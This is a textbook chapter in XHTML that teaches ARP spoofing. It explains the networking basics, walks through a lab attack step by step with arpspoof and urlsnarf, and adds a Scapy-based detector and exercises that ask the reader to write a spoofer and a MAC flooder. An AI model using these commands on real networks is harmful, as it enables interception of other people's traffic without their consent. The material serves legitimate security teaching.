<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch2"><span epub:type="pagebreak" id="page_17"/><strong><span class="big">2</span><br/>CAPTURING TRAFFIC WITH ARP SPOOFING</strong></h2>
		<p class="verse"><em>Pay no attention to the man behind the curtain!</em></p>
		<p class="chap-au">–Noel Langley, <em>The Wizard of Oz</em></p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">Anyone who walks into a coffee shop and connects to its Wi-Fi network can intercept and view other users’ unencrypted web traffic using a technique called <em>ARP spoofing</em>, which exploits a vulnerability in the design of the address resolution protocol (ARP). In this chapter, we explain how ARP works, describe the steps of an ARP spoofing attack, and then perform one ourselves.</p>
		<h3 class="h3" id="ch02lev12"><strong>How the Internet Transmits Data</strong></h3>
		<p class="noindent">Before we can discuss ARP spoofing, we must first understand the internet’s general structure. This section describes how the internet transmits data through a hierarchical network using packets, MAC addresses, and IP addresses.</p>
		<h4 class="h4" id="ch02lev13"><span epub:type="pagebreak" id="page_18"/><strong><em>Packets</em></strong></h4>
		<p class="noindent">All information on the internet is transmitted in <em>packets</em>. You can think of a packet as an envelope that contains the data that you want to send. As with the postal service, these packets are routed to their destinations based on a specified address. <a href="ch02.xhtml#ch2fig1">Figure 2-1</a> shows some parallels between envelopes and packets.</p>
		<div class="image" id="ch2fig1">
			<img alt="image" src="../images/ch02fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 2-1: Parallels between envelopes and packets</em></p>
		<p class="indent">The From Address section on an envelope contains two critical pieces of information: 1) the name of the person sending the letter, and 2) where they live. Similarly, packets have a source (<em>media access control [MAC] address</em>) that represents the machine sending the packet and a source (<em>IP address</em>) that represents where the packet came from. Other similar fields, known as <em>packet headers</em>, represent the packet’s destination.</p>
		<p class="indent">The internet uses devices called <em>routers</em> to sort and forward packets. Packets make their way through the internet, traveling from router to router like mail travels from post office to post office.</p>
		<h4 class="h4" id="ch02lev14"><strong><em>MAC Addresses</em></strong></h4>
		<p class="noindent">Your laptop contains a <em>network interface card (NIC)</em> that allows it to connect to Wi-Fi routers. This card has a unique address, called a MAC address, that identifies your machine on the network. When the router wants to send your computer information, it labels that packet with your laptop’s MAC address and then broadcasts it as a radio signal. All machines connected to that router receive this radio signal and check the packet’s MAC address to see whether the packet is intended for them. MAC addresses are normally 48-bit numbers written in hexadecimal (for example, 08:00:27:3b:8f:ed).</p>
		<h4 class="h4" id="ch02lev15"><strong><em>IP Addresses</em></strong></h4>
		<p class="noindent">You probably already know that IP addresses also identify machines on a network. So why do we need both IP and MAC addresses? Well, networks <span epub:type="pagebreak" id="page_19"/>consist of hierarchical regions similarly to how some countries are split into states, which themselves contain cities. IP addresses follow a structure that allows them to identify a device’s place in the larger network. If you moved to another coffee shop, your laptop would be assigned a new IP address to reflect its new location; however, your MAC address would remain the same.</p>
		<p class="indent">An IPv4 address encodes the network hierarchy information in a 32-bit number. This number is typically represented in four sections separated by dots (such as 192.168.3.1). Each section represents an 8-bit binary number. For example, the 3 in 192.168.3.1 actually represents the 8-bit binary number 00000011.</p>
		<p class="indent">IP addresses in the same region of the hierarchy also share the same upper-level bits. For example, all machines on the University of Virginia campus have IPv4 addresses like 128.143.xxx.xxx. You’ll also see this written in Classless inter-domain routing (CIDR) notation as 128.143.1.1/16, indicating that machines share the same 16 upper bits, or the first two numbers. Because IP addresses follow a particular structure, routers can use parts of the IP address to decide how to route a packet through the hierarchy. <a href="ch02.xhtml#ch2fig2">Figure 2-2</a> shows a simplified example of this hierarchy of routers.</p>
		<div class="image" id="ch2fig2">
			<img alt="image" src="../images/ch02fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 2-2: A simplified view of the network hierarchy</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_20"/><a href="ch02.xhtml#ch2fig2">Figure 2-2</a> also shows a <em>digital subscriber line access multiplexer (DSLAM)</em>. A DSLAM allows signals associated with internet traffic to be sent over wires originally intended for cable television. The DSLAM distinguishes between internet and television signals, which is why you can connect both your television and router to the same cable socket.</p>
		<p class="indent">Let’s use the coffee shop example to follow a packet through the network hierarchy. Imagine you’re in a coffee shop in San Francisco and access the following web page: <em><a href="http://www.cs.virginia.edu">http://www.cs.virginia.edu</a></em>. This web page is hosted on a web server with the IP address 128.143.67.11. On the first leg of its journey, the web request passes through your laptop’s NIC, which then sends it to the Wi-Fi router in the coffee shop. The router then sends the web request to the DSLAM, which forwards the request to a router owned by an <em>internet service provider (ISP)</em>, like Comcast. The Comcast routers then compare the IP address to a list of prefixes until it finds a match. For example, it might find a match for the prefix 128.xxx.xxx.xxx, indicating its connection to that section of the hierarchy. As the request is sent through the hierarchy, the matches will become more specific. For example, the address will need to match 128.143.xxx.xxx, then 128.143.67.xxx. Once the packet reaches the lowest level of the hierarchy, where there are no more routers, the router uses the MAC address in the packet to determine the request’s final destination. We refer to the lowest level of the hierarchy as a <em>local area network (LAN)</em> because all of the machines in that level are connected through a single router.</p>
		<p class="indent">Now that we have a general overview of the structure of the internet, we can discuss attacks that take place at the lowest level of the hierarchy.</p>
		<h4 class="h4" id="ch02lev16"><strong><em>ARP Tables</em></strong></h4>
		<p class="noindent">We’ve established that after a packet has reached its designated LAN, the network uses the packet’s MAC address to determine its final destination. But how does the router know the MAC address of the machine with the IP address 128.143.67.11? This is where ARP is useful. Following ARP, the router sends a message called an <em>ARP query</em> to all machines on the network, asking the machine with the IP address 128.143.67.11 to reply with an <em>ARP response</em> containing its MAC address. The router will then store this mapping between the IP address and MAC in a special table, called an <em>ARP table</em>. By storing this information in the ARP table, the router reduces the need to issue ARP queries in the near future.</p>
		<div class="sidebar">
			<p class="boxtitle-d"><strong>THE QUICK VERSION</strong></p>
			<p class="noindent">MAC addresses identify who you are, IP addresses identify where you are, and ARP tables manage the mapping between who you are and where you are on the network. In an ARP spoofing attack, we pretend to be someone else.</p>
		</div>
		<h3 class="h3" id="ch02lev17"><span epub:type="pagebreak" id="page_21"/><strong>ARP Spoofing Attacks</strong></h3>
		<p class="noindent">An ARP spoofing attack consists of two phases. During the first phase, the attacker sends a fake ARP response to the victim, stating that the attacker’s MAC address maps to the router’s IP address. This allows the attacker to trick the victim into believing that the attacker’s machine is the router. During the second phase, the victim accepts the fake ARP packet sent by the attacker and updates the mapping in its ARP table to reflect that the attacker’s MAC address now maps to the router’s IP address. This means that the victim’s internet traffic will be sent to the attacker’s machine instead of the router. The attacker’s machine can then forward this information to the router after inspecting it.</p>
		<p class="indent">If the attacker also wants to intercept internet traffic intended for the victim, the attacker must also trick the router into sending it the victim’s traffic. Therefore, the attacker must create a fake ARP packet indicating that the victim’s IP address maps to the attacker’s MAC address. This allows the attacker to intercept and inspect incoming internet traffic and then forward that traffic to the victim.</p>
		<p class="indent">We can explain the ideas behind an ARP spoofing attack with a simple diagram, shown in <a href="ch02.xhtml#ch2fig3">Figure 2-3</a>. Here, Jane (the attacker) tricks Alice (the victim) into sending her mail to Jane.</p>
		<div class="image" id="ch2fig3">
			<img alt="image" src="../images/ch02fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 2-3: An example of a spoofing attack involving a postal worker</em></p>
		<p class="indent">The ARP spoofing attack is an example of a <em>man-in-the-middle</em> attack, because the attacker places themselves between the victim and router.</p>
		<h3 class="h3" id="ch02lev18"><strong>Performing an ARP Spoofing Attack</strong></h3>
		<p class="noindent">Let’s perform an ARP spoofing attack. First, you must ensure that you’ve started the pfSense, Kali, and Metasploitable virtual machines before <span epub:type="pagebreak" id="page_22"/>beginning this attack. Visit <a href="ch01.xhtml#ch1">Chapter 1</a> for instructions on doing so. Now let’s install the tools that we’ll need to perform the ARP spoofing attack. Open a terminal on the Kali Linux virtual machine and install the <code>dsniff</code> tool. The default password for the Kali Linux virtual machine is “kali”. Start by running <code><strong>sudo -i</strong></code> to become a root user. You will also need to update the <code>apt-get</code> package manager by running <code><strong>apt-get update</strong></code>.</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo -i</span><br/>kali@kali:~$ <span class="codestrong1">apt-get update</span><br/>kali@kali:~$ <span class="codestrong1">apt-get install dsniff</span></pre>
		<p class="indent">The <code>dsniff</code> tool contains several useful tools for intercepting network traffic, such as <code>arpspoof</code>, a tool that executes an ARP spoofing attack.</p>
		<p class="indent">We must discover the IP addresses of the other machines on the network to <em>spoof</em> them (that is, pretend to be them). Run the <code>netdiscover</code> tool using the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo netdiscover</span></pre>
		<p class="indent">The <code>netdiscover</code> works by scanning the network using ARP queries. It issues ARP queries for all possible IP addresses on the subnetwork, and when a machine on the network responds, it records and displays the machine’s MAC address and IP address. The <code>netdiscover</code> tool also infers the NIC manufacturer from the MAC address. Because all MAC addresses must be unique, a central board at the Institute of Electrical and Electronics Engineers (IEEE) issues manufacturers a range of MAC addresses in order to ensure uniqueness.</p>
		<p class="indent">Your scan should detect two machines on the network and generate the output shown here:</p>
		<pre>IP                At MAC Address     Count     Len  MAC Vendor / Hostname<br/>
-----------------------------------------------------------------------------<br/>
192.168.100.1     08:00:27:3b:8f:ed      1      60  PCS Systemtechnik GmbH<br/>
192.168.100.101   08:00:27:fe:31:e6      1      60  PCS Systemtechnik GmbH</pre>
		<p class="indent">The actual IP addresses returned will vary depending on your setup. The machine with the lowest IP address is normally the router on the LAN. We’ll refer to this IP address as <em>&lt;ROUTER_IP&gt;</em> for the rest of this chapter. The second IP address belongs to the Metasploitable virtual machine (our victim), which we’ll refer to as <em>&lt;VICTIM_IP&gt;</em>. Once you’ve discovered both machines, end the scan by pressing CTRL-C.</p>
		<p class="indent">Next, you will need to allow the Kali Linux machine to forward packets on behalf of other machines by enabling IP forwarding. Make sure that you’re a root user on Kali Linux, and then enable IP forwarding by setting the IP forwarding flag:</p>
		<pre>kali@kali:~$ <span class="codestrong1">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></pre>
		<p class="indent"><span epub:type="pagebreak" id="page_23"/>Now that you’ve enabled IP forwarding, you’ll need to trick the victim into believing you’re the router. Do this by issuing fake ARP replies stating that your MAC address maps to the router’s IP address. <a href="ch02.xhtml#ch2fig4">Figure 2-4</a> shows an example of this step in the attack.</p>
		<div class="image" id="ch2fig4">
			<img alt="image" src="../images/ch02fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 2-4: The first stage of an ARP spoofing attack</em></p>
		<p class="indent">You can generate multiple fake ARP replies by running the following command:</p>
		<pre>arpspoof -i eth0 -t <span class="codeitalic">&lt;VICTIM_IP&gt; &lt;ROUTER_IP&gt;</span></pre>
		<p class="indent">The <code>-t</code> flag specifies the target, and the <code>-i</code> flag represents the interface. Your NIC supports several ways of connecting to the network. For example, <code>wlan</code> represents a wireless LAN (Wi-Fi connection), and <code>eth0</code> represents an Ethernet connection. In this virtual lab environment, the machines are virtually connected by Ethernet, so you’ll use <code>eth0</code> for your interface. In the coffee shop environment, the interface would be set to <code>wlan</code>.</p>
		<p class="indent">The following snippet shows the result of running <code>arpspoof</code>. You’ll need to generate multiple fake ARP replies to ensure that the table is always updated with the incorrect information. The tool will generate multiple packets for you, so you need to run it only once.</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo arpspoof -i eth0 -t 192.168.100.101 192.168.100.1</span><br/>
[sudo] password for kali:<br/>
8:0:27:1f:30:76 8:0:27:fe:31:e6 0806 42: arp reply 192.168.100.1 is-at 8:0:27:1f:30:76 <span class="ent">➊</span><br/>
8:0:27:1f:30:76 8:0:27:fe:31:e6 0806 42: arp reply 192.168.100.1 is-at 8:0:27:1f:30:76</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_24"/>Let’s examine the command’s output, paying particular attention to the first line <span class="ent">➊</span>. This line represents a summary of the information in the packet that was just sent. The summary is composed of five key parts:</p>
		<p class="numbera">1. <code>8:0:27:1f:30:76</code> is the MAC address of the Kali Linux machine (attacker), which created the packet.</p>
		<p class="number">2. <code>8:0:27:fe:31:e6</code> is the MAC address of the machine (victim) that will receive the packet.</p>
		<p class="number">3. <code>0806</code> is a type field indicating that an ARP packet is contained within the Ethernet frame being transmitted.</p>
		<p class="number">4. <code>42</code> represents the total number of bytes associated with the Ethernet frame.</p>
		<p class="number">5. The remaining section, <code>arp reply 192.168.100.1 is-at 8:0:27:1f:30:76</code>, is a summary of the ARP reply that falsely states that the router’s IP address (<code>192.168.100.1</code>) is associated with the Kali Linux machine’s MAC address (<code>8:0:27:1f:30:76</code>).</p>
		<p class="indenta">You must also trick the router into believing you’re the victim so that you can intercept incoming internet traffic on the victim’s behalf. Open a new terminal and run the command that follows. Notice that <em>&lt;ROUTER_IP&gt;</em> and <em>&lt;VICTIM_IP&gt;</em> are now reversed. This is because you’re now generating packets to trick the router into believing you’re the victim:</p>
		<pre>kali@kali:~$ <span class="codestrong1">arpspoof -i eth0 -t <span class="codeitalic">&lt;ROUTER_IP&gt; &lt;VICTIM_IP&gt;</span></span></pre>
		<p class="indent">Now that you’ve spoofed the victim and router, what can you do with the intercepted packets? Let’s inspect the packets we’ve intercepted and extract URLs from them. This will allow us to generate a list of websites that the victim visits. Extract the URLs by running the following command in a new terminal:</p>
		<pre>kali@kali:~$ <span class="codestrong1">urlsnarf -i eth0</span></pre>
		<p class="indent">You can also generate some internet traffic on the victim machine. Log in to the Metasploitable virtual machine using <strong>msfadmin</strong> for both the username and password, and then enter the following command to generate a web request to <em><a href="http://google.com">google.com</a></em>:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">wget http://www.google.com</span></pre>
		<p class="indent"><a href="ch02.xhtml#ch2fig5">Figure 2-5</a> shows an overview of what’s occurring during this step.</p>
		<div class="image" id="ch2fig5">
			<span epub:type="pagebreak" id="page_25"/>
			<img alt="image" src="../images/ch02fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 2-5: The second stage of the ARP spoofing attack, in which the victim uses the corrupted ARP table to address packets</em></p>
		<p class="indent">If you’ve done everything correctly, the URL associated with the web request will show up in the terminal after a couple of minutes. Be patient; it takes time to parse the packets:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo urlsnarf -i eth0</span><br/>urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]<br/>
192.168.100.101 - - "GET http://www.google.com/ HTTP/1.0"<br/></pre>
		<p class="indent">Take a look at this output. Although we’re showing only the URL here, the attacking machine is capturing all of the packets the victim sends and receives from the internet. This means that the attacker can see any unencrypted information the victim sends over the network. It also means an attacker can modify packets to inject malicious code on the machine.</p>
		<p class="indent">Once you’re done performing your malicious actions, don’t leave the ARP tables in the corrupted state. After the attacker leaves the coffee shop, the victim will no longer be able to connect to the internet, and they’ll suspect foul play. You must restore the ARP tables to their original configurations before shutting down the attack. Thankfully, <code>arpspoof</code> does this for us. Shut down the attack by pressing CTRL-C in both terminals running <code>arpspoof</code>.</p>
		<div class="sidebar">
			<p class="boxtitle-d"><span epub:type="pagebreak" id="page_26"/><strong>PROTECTING YOURSELF AGAINST ARP SPOOFING</strong></p>
			<p class="noindent">Although it’s difficult to prevent an ARP spoofing attack, encrypting your internet traffic helps protect your information from being stolen or modified. Any traffic sent over an HTTPS connection is encrypted. However, manually checking to ensure that every URL you visit uses HTTPS is tedious, so the Electronic Frontier Foundation (<em>eff.org</em>) has created a web browser extension (for Chrome, Edge, Firefox, and Opera) called HTTPS Everywhere that ensures that all your web traffic goes over an HTTPS connection. Installing this plug-in is a great way to protect yourself.</p>
		</div>
		<h3 class="h3" id="ch02lev19"><strong>Detecting an ARP Spoofing Attack</strong></h3>
		<p class="noindent">In this section, we’ll write a Python program to heuristically detect an ARP spoofing attack. We’ll build our own ARP table using a dictionary and then check to see whether the packet we receive has changed an entry. We’ll assume that any packet that changes the state of our table is malicious.</p>
		<p class="indent">We’ll begin by selecting a library that can both intercept and parse the packets that pass through our NIC. Scapy is a popular Python package that allows us to read and send packets. Before you can use Scapy, you’ll need to install it with <code>pip3</code>. Use the following commands to get both <code>pip3</code> and Scapy:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo apt-get install python3-pip</span><br/>kali@kali:~$ <span class="codestrong1">pip3 install --pre scapy[basic]</span></pre>
		<p class="indent">Once you’ve installed Scapy, you can import the <code>sniff</code> library, which allows us to capture and inspect the packets that pass through our NIC. Copy and paste the following Python program (<em>arpDetector.py</em>) into Mousepad or the code editor of your choice. To start Mousepad, run <code><strong>mousepad &amp;</strong></code>.</p>
		<pre>from scapy.all import sniff<br/>IP_MAC_Map = {}<br/><br/>def processPacket(packet):<br/>
    src_IP = packet['ARP'].psrc<br/>
    src_MAC = packet['Ether'].src<br/>
    if src_MAC in IP_MAC_Map.keys():<br/>
        if IP_MAC_Map[src_MAC] != src_IP :<br/>
            try:<br/>
                old_IP =  IP_MAC_Map[src_MAC]<br/>
            except:<br/>
                old_IP = "unknown"<br/>
            message = ("\n Possible ARP attack detected \n "<br/>
                        + "It is possible that the machine with IP address \n "<br/>
                        + str(old_IP) + " is pretending to be " + str(src_IP)<br/>
                         +"\n ")<br/>
            return message<br/><span epub:type="pagebreak" id="page_27"/>    else:<br/>
        IP_MAC_Map[src_MAC] = src_IP<br/><br/><span class="ent">➊</span> sniff(count=0, filter="arp", store = 0, prn = processPacket)</pre>
		<p class="indent">The <code>sniff()</code> function <span class="ent">➊</span> in the Scapy library takes several optional parameters. In this implementation, we use the <code>count</code> parameter to indicate the number of packets to sniff. A count value of 0 means that the library should continuously sniff packets. We also use the <code>filter</code> parameter, which specifies the type of packet to capture. Because we’re interested in only ARP packets, we specify a filter value of <code>"arp"</code>. The <code>store</code> parameter indicates the number of packets to store. We set the parameter to 0 because we don’t want to waste memory by storing packets. Lastly, the <code>prn</code> parameter is a functional pointer that points to the function called whenever a packet is received. It takes a single parameter, which represents the received packet, as input.</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo python3 arpDetector.py</span></pre>
		<p class="indent">As the program is running, open another Kali terminal and execute an ARP spoofing attack.</p>
		<p class="indent">Then, quit the attack by pressing CTRL-C. This will cause <code>arpspoof</code> to issue packets that restore the ARP table. When your Python program detects these packets, you’ll see a message like the following:</p>
		<pre>Possible ARP attack detected<br/>It is possible that the machine with IP address<br/>
192.168.0.67 is pretending to be 192.168.48.67</pre>
		<h3 class="h3" id="ch02lev20"><strong>Exercises</strong></h3>
		<p class="noindent">Deepen your understanding of ARP spoofing and forwarding by attempting the following exercises, listed in order of increasing difficulty. The first exercise requires running only a single command, but the second is more challenging because it requires you to write a Python program and deepen your understanding of the Scapy library. The final exercise prompts you to apply the fundamentals you learned in this chapter to a new attack.</p>
		<h4 class="h4" id="ch02lev21"><strong><em>Inspect ARP Tables</em></strong></h4>
		<p class="noindent">Inspect the ARP tables on the Metasploitable virtual machine by running this command:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">sudo arp -a</span></pre>
		<p class="indent"><span epub:type="pagebreak" id="page_28"/>Compare the state of the ARP tables on the Metasploitable server before and after the ARP spoofing attack. Do you notice any differences? If so, which entries have changed?</p>
		<h4 class="h4" id="ch02lev22"><strong><em>Implement an ARP Spoofer in Python</em></strong></h4>
		<p class="noindent">In this chapter, we discussed how to execute an ARP spoofing attack. For this exercise, you’ll write a Python program that allows you to perform an ARP spoofing attack with a single command, shown here:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo python3 arpSpoof.py <span class="codeitalic">&lt;VICTIM_IP&gt;  &lt;ROUTER_IP&gt;</span></span></pre>
		<p class="indent">To do this, you’ll need to write a program that performs the steps discussed in this chapter. Your program should generate spoofed ARP packets and send them to both the victim and router. Once the attack is complete, your program should restore the ARP tables to their original state. Write your program (<em>arpSpoof.py</em>) in Python, and use the Scapy library to construct and send the packets. We’ve included skeleton code here:</p>
		<pre>   from scapy.all import *<br/>
   import sys<br/><br/><span class="ent">➊</span> def arp_spoof(dest_ip, dest_mac, source_ip):<br/>
       pass<br/><br/><span class="ent">➋</span> def arp_restore(dest_ip, dest_mac, source_ip, source_mac):<br/>
       packet= <span class="ent">➌</span> ARP(op="is-at", hwsrc=source_mac,<br/>
                       psrc= source_ip, hwdst= dest_mac, pdst= dest_ip)<br/>
     <span class="ent">➍</span> send(packet, verbose=False)<br/><br/>
    def main():<br/>
        victim_ip= sys.argv[1]<br/>
        router_ip= sys.argv[2]<br/>
        victim_mac = getmacbyip(victim_ip)<br/>
        router_mac = getmacbyip(router_ip)<br/><br/>
        try:<br/>
           print("Sending spoofed ARP packets")<br/>
           while True:<br/>
              arp_spoof(victim_ip, victim_mac, router_ip)<br/>
              arp_spoof(router_ip, router_mac, victim_ip)<br/>
        except KeyboardInterrupt:<br/>
           print("Restoring ARP Tables")<br/>
           arp_restore(router_ip, router_mac, victim_ip, victim_mac)<br/>
           arp_restore(victim_ip, victim_mac, router_ip, router_mac)<br/>
           quit()<br/><br/>
    main()</pre>
		<p class="indent">Implement the <code>arp_spoof()</code> function <span class="ent">➊</span>. This function should be very similar to <code>arp_restore()</code> <span class="ent">➋</span>, which restores the ARP tables to their original state. <span epub:type="pagebreak" id="page_29"/>You can use <code>arp_restore()</code> as a guide. Within that function, we create a new ARP packet. The <code>ARP()</code> function <span class="ent">➌</span> takes several options (<code>op</code>). The <code>"is-at"</code> option represents an ARP reply, and the <code>"who-has"</code> option represents an ARP request. You might also see these options listed as the numbers 2 and 1, respectively. Finally, we send the packet we created <span class="ent">➍</span>.</p>
		<h4 class="h4" id="ch02lev23"><strong><em>MAC Flooding</em></strong></h4>
		<p class="noindent"><em>Content addressable memory (CAM)</em> is the memory hardware used in both routers and switches. In switches, these memories map MAC addresses to the corresponding ports. Thus, CAM can store only a limited number of entries. If the switch’s CAM is full, it will broadcast a message on all ports. Attackers can force this behavior by sending the switch packets with random MAC addresses. Write a Scapy program that performs this attack.<span epub:type="pagebreak" id="page_30"/></p>
	</body>
</html>